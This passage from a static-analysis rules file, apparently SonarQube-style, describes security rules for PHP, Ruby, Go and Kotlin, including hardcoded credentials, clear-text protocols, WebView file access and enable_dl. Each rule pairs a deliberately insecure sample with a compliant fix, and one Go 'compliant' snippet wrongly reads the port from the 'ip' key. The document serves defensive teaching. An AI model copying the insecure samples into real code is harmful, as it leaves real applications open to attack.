        "htmlDesc": "<p>The <code>enable_dl</code> PHP configuration setting allows PHP extensions to be loaded dynamically at runtime.</p>\n<h2>Why is this an issue?</h2>\n<p>When dynamic loading is enabled, PHP code can load arbitrary PHP extensions by calling the <code>dl</code> function. This can be used to bypass\nrestrictions set with the <code>open_basedir</code> configuration.</p>\n<p>PHP defaults to allowing dynamic loading.</p>\n<h2>How to fix it</h2>\n<p><code>enable_dl</code> setting should be set to <code>0</code> in the main PHP configuration.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n; php.ini\nenable_dl=1  ; Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n; php.ini\nenable_dl=0\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "ruby:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nip = \"192.168.12.42\"; // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nip = IP_ADDRESS; // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n</ul>",
        "severity": "MINOR"
      },
      "ruby:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "go:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar (\n  ip   = \"192.168.12.42\"\n  port = 3333\n)\n\nSocketClient(ip, port)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconfig, err := ReadConfig(\"properties.ini\")\n\nip := config[\"ip\"]\nport := config[\"ip\"]\n\nSocketClient(ip, port)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n</ul>",
        "severity": "MINOR"
      },
      "go:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nfunc connect()  {\n  user := \"root\"\n  password:= \"supersecret\" // Sensitive\n\n  url := \"login=\" + user + \"&amp;passwd=\" + password\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nfunc connect()  {\n  user := getEncryptedUser()\n  password:= getEncryptedPass() // Compliant\n\n  url := \"login=\" + user + \"&amp;passwd=\" + password\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "kotlin:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>These clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> libraries are based on unencrypted protocols and\nare not recommended:</p>\n<pre>\nval telnet = TelnetClient(); // Sensitive\n\nval ftpClient = FTPClient(); // Sensitive\n\nval smtpClient = SMTPClient(); // Sensitive\n</pre>\n<p>Unencrypted HTTP connections, when using <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance, should be avoided:</p>\n<pre>\nval spec: ConnectionSpec = ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive\n  .build()\n</pre>\n<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed\ncontent):</p>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW) // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use instead these clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> and <a\nhref=\"http://www.jcraft.com/jsch/\">JSch/ssh</a> library:</p>\n<pre>\nJSch jsch = JSch();\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  val ftpsClient = FTPSClient(true);\n}\nelse {\n  val ftpsClient = FTPSClient();\n}\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  val smtpsClient = SMTPSClient(true);\n}\nelse {\n  val smtpsClient = SMTPSClient();\n  smtpsClient.connect(\"127.0.0.1\", 25);\n  if (smtpsClient.execTLS()) {\n    // commands\n  }\n}\n</pre>\n<p>Perform HTTP encrypted connections, with <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance:</p>\n<pre>\nval spec: ConnectionSpec =ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n  .build()\n</pre>\n<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec Verification\n  Standard</a> - Network Communication Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">OWASP Mobile Top 10 2016 Category M3</a> - Insecure\n  Communication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/200\">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/319\">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S6300": {
        "name": "Using unencrypted files in mobile applications is security-sensitive",
        "htmlDesc": "<p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with\nphysical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The file contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a> can be used to easily encrypt files.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nval targetFile = File(activity.filesDir, \"data.txt\")\ntargetFile.writeText(fileContent)  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval mainKey = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)\n\nval encryptedFile = EncryptedFile.Builder(\n    File(activity.filesDir, \"data.txt\"),\n    activity,\n    mainKey,\n    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB\n).build()\n\nencryptedFile.openFileOutput().apply {\n    write(fileContent)\n    flush()\n    close()\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/311\">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(true)</a>\nfor Android enables debugging support:</p>\n<pre>\nimport android.webkit.WebView\n\nWebView.setWebContentsDebuggingEnabled(true) // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a\nhref=\"https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)\">WebView.setWebContentsDebuggingEnabled(false)</a>\nfor Android disables debugging support:</p>\n<pre>\nimport android.webkit.WebView\n\nWebView.setWebContentsDebuggingEnabled(false)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/489\">MITRE, CWE-489</a> - Active Debug Code </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/215\">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>\n</ul>",
        "severity": "MINOR"
      },
      "kotlin:S6362": {
        "name": "Enabling JavaScript support for WebViews is security-sensitive",
        "htmlDesc": "<p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web\napplication, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a\nWebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result\nin more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary\nand the authenticity of the web resources can be guaranteed.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li>\n  <li> The WebView contains untrusted data that could cause harm when rendered. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be\nrendered.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setJavaScriptEnabled(true) // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setJavaScriptEnabled(false)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">OWASP Top 10 2021 Category A3</a> - Injection </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">OWASP Top 10 2017 Category A7</a> - Cross-Site\n  Scripting (XSS) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/79\">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation\n  ('Cross-site Scripting') </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S6363": {
        "name": "Enabling file access for WebViews is security-sensitive",
        "htmlDesc": "<p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web\napplication, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>\n<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> No local files have to be accessed by the Webview. </li>\n  <li> The WebView contains untrusted data that could cause harm when rendered. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site\nScripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setAllowContentAccess(true) // Sensitive\nwebView.getSettings().setAllowFileAccess(true) // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView\n\nval webView: WebView = findViewById(R.id.webview)\nwebView.getSettings().setAllowContentAccess(false)\nwebView.getSettings().setAllowFileAccess(false)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">OWASP Top 10 2021 Category A3</a> - Injection </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">OWASP Top 10 2017 Category A7</a> - Cross-Site\n  Scripting (XSS) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/79\">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation\n  ('Cross-site Scripting') </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S2053": {
        "name": "Hashes should include an unpredictable salt",
        "htmlDesc": "<p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>\n<h2>Why is this an issue?</h2>\n<p>During the process of password hashing, an additional component, known as a \"salt,\" is often integrated to bolster the overall security. This salt,\nacting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>\n<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it\nis too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.\nSimilarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical\npassword hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on\nimplementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>\n<h3>What is the potential impact?</h3>\n<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.\nThis could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>\n<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying\nevery possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt\ncan make the task significantly easier and faster.</p>\n<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully\ncracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>\n<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters\nof password hashes with identical salt that can then be attacked as explained before.</p>\n<p>With short salts, the probability of a collision between two users' passwords and salts couple might be low 